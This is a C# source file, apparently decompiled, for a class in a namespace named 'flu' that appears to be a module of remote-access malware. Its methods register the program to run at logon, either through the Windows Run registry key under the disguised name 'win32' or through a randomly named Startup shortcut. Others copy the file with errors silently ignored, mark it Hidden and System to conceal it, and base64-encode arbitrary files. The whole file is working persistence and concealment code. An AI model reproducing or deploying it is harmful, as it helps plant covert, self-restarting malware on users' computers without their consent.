using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace flu;

internal class File
{
	public enum RunLocation
	{
		InRegistry,
		InStartup
	}

	public const string rutaRegistroEjecutableFlu = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private string path;

	public File(string filename)
	{
		path = filename;
	}

	public bool existKey(string rKey)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string text = array[num];
				if (text.Equals(rKey))
				{
					break;
				}
				num++;
				continue;
			}
			registryKey.Close();
			return false;
		}
		return true;
	}

	public string getKeyValue(string rKey)
	{
		string result = string.Empty;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		foreach (string text in array)
		{
			if (text.Equals(rKey))
			{
				try
				{
					result = registryKey.GetValue(text)!.ToString();
				}
				catch
				{
				}
				break;
			}
		}
		registryKey.Close();
		return result;
	}

	public void Register(RunLocation where)
	{
		if (where == RunLocation.InRegistry)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("win32", path);
			registryKey.Close();
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + Path.GetRandomFileName() + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + path);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
		streamWriter.Flush();
	}

	public void CopyTo(string newFilename)
	{
		try
		{
			System.IO.File.Copy(path, newFilename, overwrite: true);
		}
		catch
		{
		}
	}

	public void Protect()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			fileInfo.Attributes = fileInfo.Attributes | FileAttributes.Hidden | FileAttributes.System;
		}
		catch
		{
		}
	}

	public static string ToBase64(string path)
	{
		FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
		return Convert.ToBase64String(array, Base64FormattingOptions.InsertLineBreaks);
	}
}
